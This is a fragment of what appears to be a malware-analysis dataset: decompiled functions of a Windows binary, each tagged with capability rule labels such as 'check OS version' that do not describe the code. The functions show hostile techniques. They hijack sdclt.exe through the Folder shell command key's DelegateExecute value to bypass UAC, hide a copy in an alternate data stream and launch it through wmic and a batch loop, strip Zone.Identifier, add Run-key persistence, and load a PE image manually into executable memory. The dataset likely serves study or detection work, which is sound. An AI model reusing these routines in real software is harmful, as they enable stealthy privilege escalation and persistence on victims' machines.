        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00413aac)\n\nuint * __fastcall fcn.004139e7(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char16_t *arg_ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t phkResult;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    phkResult = 0;\n    if (*0x5530bc == 0) {\n        puVar1 = fcn.0040460a(0x41c1c8);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, *puVar1, 0, 0x101, &phkResult);\n        fcn.00406f1d();\n        if (iVar2 == 0) {\n            arg_ch = L\"MachineGuid\";\n            uVar3 = fcn.0040460a(L\"MachineGuid\");\n            fcn.00414d78(uVar3, arg_ch);\n            fcn.00406f1d();\n            if (phkResult != 0) {\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n            }\n            phkResult = 0;\n        }\n        uVar3 = fcn.00406ffc();\n        fcn.00403eca(uVar3);\n        fcn.00404081();\n        puVar1 = param_1;\n    }\n    else {\n        puVar1 = 0x5530b8;\n    }\n    fcn.00403eca(puVar1);\n    if (phkResult != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n    }\n    return param_1;\n}\n",
        "token_count": 424
    },
    "00413b7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413b7c(uint arg_8h, uint nNumberOfBytesToRead, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    int32_t *in_ECX;\n    uint lpNumberOfBytesRead;\n    \n    if (*in_ECX != 0) {\n        fcn.00414047();\n    }\n    lpNumberOfBytesRead = 0;\n    arg_8h_00 = fcn.00406f77();\n    (*_sym.imp.KERNEL32.dll_SetFilePointer)(in_ECX[2], 0, 0, arg_10h);\n    uVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(in_ECX[2], arg_8h_00, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n    fcn.00403fc7(arg_8h_00, nNumberOfBytesToRead);\n    fcn.00406f66();\n    if (*in_ECX != 0) {\n        (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[3]);\n    }\n    return uVar1;\n}\n",
        "token_count": 252
    },
    "00413ef9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413ef9(uint *lpBuffer)\n\n{\n    uint uVar1;\n    int32_t *in_ECX;\n    uint lpNumberOfBytesWritten;\n    \n    if (*in_ECX != 0) {\n        fcn.00414047();\n    }\n    lpNumberOfBytesWritten = 0;\n    (*_sym.imp.KERNEL32.dll_SetFilePointer)(in_ECX[2], 0, 0, 2);\n    uVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(in_ECX[2], *lpBuffer, lpBuffer[1], &lpNumberOfBytesWritten, 0);\n    if (*in_ECX != 0) {\n        (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[3]);\n    }\n    return uVar1;\n}\n",
        "token_count": 176
    },
    "004145a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004145a1(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uint var_2ch;\n    uint var_24h;\n    code *var_1ch;\n    code *var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    code *var_8h;\n    int32_t var_4h;\n    \n    var_10h = param_1;\n    fcn.004143f4(param_1);\n    pcVar1 = fcn.0041473a();\n    var_1ch = pcVar1;\n    fcn.004143f4();\n    var_14h = fcn.0041473a();\n    fcn.004143f4();\n    var_8h = fcn.0041473a();\n    fcn.004143f4();\n    var_18h = fcn.0041473a();\n    piVar2 = fcn.00414422(1, 0);\n    if (piVar2 != NULL) {\n        for (; piVar2[3] != 0; piVar2 = piVar2 + 5) {\n            var_4h = 0;\n            (*var_14h)(&var_24h, piVar2[3] + param_1);\n            iVar3 = (*pcVar1)(0, 0, &var_24h, &var_4h);\n            if ((iVar3 < 0) || (var_4h == 0)) {\n                return 0;\n            }\n            iVar3 = *piVar2;\n            if (iVar3 == 0) {\n                iVar3 = piVar2[4];\n            }\n            piVar6 = piVar2[4] + param_1;\n            puVar5 = param_1 + iVar3;\n            uVar4 = *puVar5;\n            pcVar1 = var_1ch;\n            param_1 = var_10h;\n            while (var_1ch = pcVar1,  var_10h = param_1,  uVar4 != 0) {\n                if (uVar4 < 0) {\n                    uVar4 = uVar4 & 0xffff;\n                    puVar7 = NULL;\n                }\n                else {\n                    (*var_18h)(&var_2ch, uVar4 + param_1 + 2);\n                    uVar4 = 0;\n                    puVar7 = &var_2ch;\n                }\n                iVar3 = (*var_8h)(var_4h, puVar7, uVar4, &var_ch);\n                if (iVar3 < 0) {\n                    return 0;\n                }\n                if (var_ch == 0) {\n                    return 0;\n                }\n                puVar5 = puVar5 + 1;\n                *piVar6 = var_ch;\n                piVar6 = piVar6 + 1;\n                pcVar1 = var_1ch;\n                param_1 = var_10h;\n                uVar4 = *puVar5;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 736
    },
    "004147a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004147a3(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t arg_8h;\n    int32_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    ulong uVar7;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00414498();\n    if ((iVar3 == 0) || (arg_8h = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, *(iVar3 + 0x50), 0x3000, 0x40),  arg_8h == 0)\n       ) {\n        arg_8h = 0;\n    }\n    else {\n        iVar4 = *(iVar3 + 0x14) + 0x18 + iVar3;\n        fcn.0040126d(arg_8h, param_1, *(iVar4 + 0x14));\n        uVar2 = 0;\n        bVar6 = *(iVar3 + 6) != 0;\n        while (bVar6) {\n            iVar5 = uVar2 * 0x28;\n            fcn.00401293(*(iVar5 + 0xc + iVar4) + arg_8h, 0, *(iVar5 + 8 + iVar4));\n            fcn.0040126d(*(iVar5 + 0xc + iVar4) + arg_8h, *(iVar5 + 0x14 + iVar4) + param_1, *(iVar5 + 0x10 + iVar4));\n            uVar2 = uVar2 + 1;\n            bVar6 = uVar2 < *(iVar3 + 6);\n        }\n        uVar7 = fcn.004146d3();\n        cVar1 = fcn.0041452d(arg_8h - uVar7, ((arg_8h >> 0x1f) - (uVar7 >> 0x20)) - (arg_8h < uVar7));\n        if (((cVar1 != '\\0') && (cVar1 = fcn.004145a1(),  cVar1 != '\\0')) && (param_2 != 0)) {\n            (*(*(iVar3 + 0x28) + arg_8h))(arg_8h, 1, 0);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 562
    },
    "00414af5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00414af5(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint arg_ch;\n    uint arg_10h;\n    uint var_668h;\n    uint var_258h;\n    uint var_254h;\n    uint dwProcessId;\n    uint var_234h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t lpString2;\n    int32_t lpString;\n    \n    fcn.00401293(&var_254h, 0, 0x228);\n    var_258h = 0x22c;\n    var_20h = 0;\n    var_1ch = 5;\n    var_24h = 5;\n    fcn.004018ac();\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar1 != -1) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar1, &var_258h);\n        while (iVar2 != 0) {\n            var_ch = dwProcessId;\n            lpString2 = 0;\n            lpString = 0;\n            fcn.0040428f(&var_234h);\n            iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1410, 0, dwProcessId);\n            if (iVar2 == -1) {\n                uVar4 = fcn.0040460a(0x419e40);\n                fcn.004043c7(uVar4);\n                fcn.00406f1d();\n                var_18h = 0;\n            }\n            else {\n                fcn.00401293(&var_668h, 0, 0x410);\n                iVar3 = (*_sym.imp.KERNEL32.dll_K32GetModuleFileNameExW)(iVar2, 0, &var_668h, 0x208);\n                if (iVar3 == 0) {\n                    uVar4 = fcn.0040460a(0x419e40);\n                    fcn.004043c7(uVar4);\n                    fcn.00406f1d();\n                    var_14h = 0;\n                }\n                else {\n                    uVar4 = fcn.0040460a(&var_668h);\n                    fcn.004043c7(uVar4);\n                    fcn.00406f1d();\n                    var_10h = 0;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            }\n            arg_ch = 0;\n            uVar4 = var_ch;\n            if (lpString2 != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n                arg_ch = fcn.00406f2c();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(arg_ch, lpString2);\n            }\n            arg_10h = 0;\n            if (lpString != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString);\n                arg_10h = fcn.00406f2c();\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(arg_10h, lpString);\n            }\n            fcn.004017a5(uVar4, arg_ch, arg_10h);\n            fcn.004015fb();\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar1, &var_258h);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    fcn.0040147b(&var_28h);\n    fcn.004014c2();\n    return param_1;\n}\n",
        "token_count": 871
    },
    "00414d03": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00414d03(uint *lpValueName)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    bool bVar2;\n    \n    if (*in_ECX == 0) {\n        bVar2 = false;\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(*in_ECX, *lpValueName);\n        bVar2 = iVar1 == 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 111
    },
    "00414d25": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00414d25(uint noname_0, uint *lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001, *lpSubKey, 0, 0, 1, 1, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 93
    },
    "00414d63": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414d63(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 64
    },
    "00414eef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414eef(int32_t lpFileName, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t lpString2;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_ECX;\n    uint noname_0;\n    uint extraout_ECX;\n    uchar *arg_8h;\n    uint arg_10h_00;\n    uchar *arg_14h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t lpNewFileName;\n    uint var_ch;\n    uint var_8h;\n    \n    var_14h = in_ECX;\n    fcn.00413960();\n    fcn.004044c4();\n    iVar1 = fcn.00414d25(noname_0, in_ECX + 4);\n    fcn.00414d63();\n    lpString2 = lpNewFileName;\n    if ((iVar1 != 0) && (lpFileName != 0)) {\n        uVar2 = fcn.00413915();\n        fcn.004043c7(uVar2);\n        fcn.00406f1d();\n        fcn.004133fb();\n        fcn.004043fa(0x4194e4);\n        fcn.00404656(in_ECX + 0x15);\n        fcn.004042c5(&lpNewFileName);\n        fcn.00406f1d();\n        uVar2 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_CopyFileW)(lpString2, in_ECX[8]);\n        if (iVar1 == 0) goto code_r0x00415282;\n        arg_14h = &stack0xffffffb0;\n        fcn.0040424e(&stack0xffffffb0);\n        arg_8h = &stack0xffffffa4;\n        uVar2 = extraout_ECX;\n        arg_10h_00 = extraout_ECX;\n        fcn.004069a9(&stack0xffffffa4);\n        fcn.0040709b(arg_8h, uVar2, arg_10h_00, arg_14h);\n        (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001, in_ECX[4]);\n        fcn.00414dee(in_ECX + 6, &var_24h, 3);\n        fcn.0040460a(in_ECX[8]);\n        uVar2 = fcn.0040460a(L\":Zone.Identifier\");\n        fcn.004042c5(uVar2);\n        fcn.00406f1d();\n        (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpNewFileName);\n        fcn.00406f1d();\n        fcn.00404081();\n    }\n    if (*in_ECX == 0) {\n        (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)();\n    }\n    if (arg_10h != NULL) {\n        (*_sym.imp.SHELL32.dll_SHGetKnownFolderPath)();\n        fcn.0040460a(var_18h);\n        fcn.004043fa(L\"\\\\programs.bat\");\n        fcn.0040460a(L\"for /F \\\"usebackq tokens=*\\\" %%A in (\\\"\");\n        fcn.004043fa(arg_10h);\n        fcn.004043fa(L\":start\");\n        fcn.004043fa(L\"\\\") do %%A\");\n        uVar2 = fcn.004045f0();\n        fcn.0040456d(&var_1ch);\n        fcn.0040456d(&lpNewFileName);\n        fcn.00415c81(uVar2);\n        fcn.00406f1d();\n        fcn.00406f1d();\n        fcn.00413915();\n        fcn.004043fa(L\"\\\\Documents:ApplicationData\");\n        fcn.0040460a(L\"wmic process call create \\'\\\"\");\n        fcn.004043fa(lpNewFileName);\n        fcn.004043fa(0x41c678);\n        fcn.004043fa(L\":start\");\n        uVar2 = fcn.004045f0();\n        fcn.0040456d(&var_20h);\n        fcn.0040456d(&var_1ch);\n        fcn.00415c81(uVar2);\n        fcn.00406f1d();\n        fcn.00406f1d();\n        (*_sym.imp.KERNEL32.dll_CopyFileW)(lpString2, lpNewFileName, 0);\n        fcn.00406f1d();\n        var_8h = 0;\n        fcn.00406f1d();\n        fcn.00406f1d();\n        var_ch = 0;\n        fcn.00406f1d();\n        in_ECX = var_14h;\n    }\n    uVar2 = 0;\n    if (arg_ch != 0) {\n        if ((lpFileName == 0) && (in_ECX[8] = 0,  lpString2 != 0)) {\n            (*_sym.imp.KERNEL32.dll_lstrlenW)();\n            iVar1 = fcn.00406e8d();\n            in_ECX[8] = iVar1;\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        }\n        arg_10h = in_ECX + 1;\n        iVar1 = fcn.00414e25(in_ECX[2], in_ECX + 5, 0x20006, 0);\n        if (iVar1 == 0) goto code_r0x00415282;\n        uVar2 = fcn.00404011(in_ECX + 8);\n        fcn.00404656(in_ECX + 0x17);\n        iVar1 = fcn.00414dee(&lpFileName, uVar2, 1);\n        fcn.00406f1d();\n        fcn.00404081();\n        if (iVar1 == 0) {\n            uVar2 = 0;\n            goto code_r0x00415282;\n        }\n        fcn.00414d63();\n    }\n    fcn.0040460a(lpString2);\n    uVar2 = fcn.0040460a(L\":Zone.Identifier\");\n    fcn.004042c5(uVar2);\n    fcn.00406f1d();\n    (*_sym.imp.KERNEL32.dll_DeleteFileW)();\n    uVar2 = 1;\n    fcn.00406f1d();\ncode_r0x00415282:\n    fcn.00406f1d();\n    fcn.00406f1d();\n    return uVar2;\n}\n",
        "token_count": 1501
    },
    "0041529e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041529e(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uchar *arg_8h_00;\n    uint arg_10h;\n    uint *arg_8h_01;\n    uint var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.00402cac(arg_8h);\n    iVar2 = fcn.00413893();\n    *(in_ECX + 8) = -0x7ffffffe - (iVar2 != 1);\n    *(in_ECX + 0xc) = 5;\n    uVar3 = fcn.0040460a(L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\\");\n    fcn.004043c7(uVar3);\n    fcn.00406f1d();\n    fcn.00404656(arg_8h + 0x38);\n    fcn.004042c5(&var_8h);\n    fcn.00406f1d();\n    uVar3 = fcn.0040460a(L\"inst\");\n    fcn.004043c7(uVar3);\n    fcn.00406f1d();\n    uVar3 = fcn.0040460a(L\"InitWindows\");\n    fcn.004043c7(uVar3);\n    fcn.00406f1d();\n    uVar3 = fcn.0040460a(L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\");\n    fcn.004043c7(uVar3);\n    fcn.00406f1d();\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)();\n    *(in_ECX + 0x24) = iVar2 == 0;\n    uVar3 = fcn.00413960();\n    fcn.004043c7(uVar3);\n    fcn.00406f1d();\n    if (*(arg_8h + 0x4c) != 0) {\n        fcn.00413915();\n        fcn.004043fa(L\"\\\\Documents:ApplicationData\");\n        uVar3 = fcn.00413960();\n        fcn.004043c7(uVar3);\n        fcn.00406f1d();\n        pcVar1 = _sym.imp.USER32.dll_CharLowerW;\n        (*_sym.imp.USER32.dll_CharLowerW)();\n        (*pcVar1)();\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)();\n        if (iVar2 == 0) {\n            *(in_ECX + 0x24) = 1;\n            fcn.00406f1d();\n            return;\n        }\n        fcn.00406f1d();\n    }\n    if (*(in_ECX + 0x24) != 0) {\n        var_ch = 0;\n        var_10h = 0;\n        if (*(arg_8h + 0x20) != 0) {\n            iVar2 = fcn.00414d78(in_ECX + 0x18, &var_10h);\n            if (iVar2 == 0) {\n                *(in_ECX + 0x28) = 0;\n            }\n            else {\n                arg_8h_01 = &var_10h;\n                fcn.00404094(arg_8h_01);\n                arg_8h_00 = &stack0xffffff78;\n                uVar3 = extraout_ECX;\n                arg_10h = extraout_ECX;\n                fcn.004069a9(&stack0xffffff78);\n                fcn.0040709b(arg_8h_00, uVar3, arg_10h, arg_8h_01);\n                uVar3 = fcn.00403f05(&var_8h);\n                fcn.004043c7(uVar3);\n                fcn.00406f1d();\n                var_8h = 0;\n                fcn.00404081();\n                *(in_ECX + 0x28) = 1;\n            }\n        }\n        iVar2 = var_10h;\n        if (*(arg_8h + 0x28) != 0) {\n            uVar3 = fcn.00413960();\n            fcn.004043c7(uVar3);\n            fcn.00406f1d();\n        }\n        if (iVar2 != 0) {\n            fcn.00406f66();\n        }\n    }\n    return;\n}\n",
        "token_count": 1015
    },
    "004154ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004154ed(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    int32_t *in_ECX;\n    uint *arg_8h_00;\n    uint var_8h;\n    \n    if (*in_ECX != 0) {\n        arg_8h_00 = &var_8h;\n        arg_ch_00 = fcn.0040424e(arg_8h_00);\n        fcn.00414dee(arg_8h, arg_ch_00, arg_8h_00);\n        fcn.00404081();\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00415520": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00415520(int32_t *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t in_EAX;\n    \n    if (*param_1 != 0) {\n        if (*param_1 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(*param_1, *param_2);\n            uVar2 = iVar1 == 0;\n        }\n        return uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 142
    },
    "004158f7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004158f7(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    fcn.00401293(0x551c00, 0, 0x208);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, 0x551c00, 0x208);\n    iVar1 = (*_sym.imp.SHELL32.dll_IsUserAnAdmin)();\n    if (iVar1 == 0) {\n        iVar1 = fcn.00413893();\n        if (iVar1 != 1) {\n            fcn.00415884();\n            uVar2 = fcn.00415c0e();\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(uVar2, 0x66, 0x41c714);\n            uVar4 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar2, uVar3);\n            (*_sym.imp.KERNEL32.dll_SizeofResource)(uVar2, uVar3);\n            iVar1 = (*_sym.imp.KERNEL32.dll_LockResource)(uVar4);\n            if (iVar1 != 0) {\n                fcn.004157f0();\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 287
    },
    "00415974": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00415974(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint lpFilename;\n    uint lpString1;\n    uint lpCommandLine;\n    uint var_2dfh;\n    uint var_100h;\n    uint var_b4h;\n    uint ARG_0;\n    uint hProcess;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint var_1ch;\n    uint uStack28;\n    uint uStack24;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00413893();\n    if (iVar3 != 1) {\n        fcn.00413915();\n        fcn.004043fa(L\"\\\\Documents:ApplicationData\");\n        fcn.00413960();\n        pcVar1 = _sym.imp.USER32.dll_CharLowerW;\n        uVar4 = (*_sym.imp.USER32.dll_CharLowerW)(var_4h);\n        uVar5 = (*pcVar1)(var_ch);\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(uVar5, uVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41e8c8);\n            var_8h = 0;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&var_8h);\n            (*_sym.imp.KERNEL32.dll_IsWow64Process)(uVar4);\n            if (var_8h != 0) {\n                fcn.00413473();\n            }\n            fcn.00415774();\n            fcn.00401293(&lpFilename, 0, 0x400);\n            (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0x400);\n            fcn.0041570f(0x41c6b8, &lpFilename);\n            fcn.0041570f(\"DelegateExecute\", 0x41c6b8);\n            (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(&lpString1, 0x104);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, L\"\\\\sdclt.exe\");\n            (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.00401293(&var_b4h, 0, 0x44);\n            puVar6 = &var_b4h;\n            puVar7 = &var_100h;\n            for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = *puVar6;\n                puVar6 = puVar6 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            var_30h = 0;\n            uStack48 = 0;\n            uStack44 = 0;\n            uStack40 = 0;\n            var_20h = 0;\n            var_1ch = 0;\n            uStack28 = 0;\n            uStack24 = 0;\n            puVar6 = \"cmd.exe /C C:\\\\Windows\\\\System32\\\\sdclt.exe\";\n            puVar7 = &lpCommandLine;\n            for (iVar3 = 10; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar7 = *puVar6;\n                puVar6 = puVar6 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = *puVar6;\n            fcn.00401293(&var_2dfh, 0, 0x1df);\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            (*_sym.imp.KERNEL32.dll_Sleep)(20000);\n            (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_100h, &var_20h);\n            (*pcVar1)(var_1ch);\n            (*pcVar1)(var_20h);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x419718, &lpString1);\n            (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 0);\n            if (var_8h != 0) {\n                fcn.0041344c();\n            }\n            (*pcVar2)(2000);\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)(0x80000001, \"Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\");\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n        fcn.00406f1d();\n        fcn.00406f1d();\n    }\n    return 0;\n}\n",
        "token_count": 1173
    },
    "00415f21": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
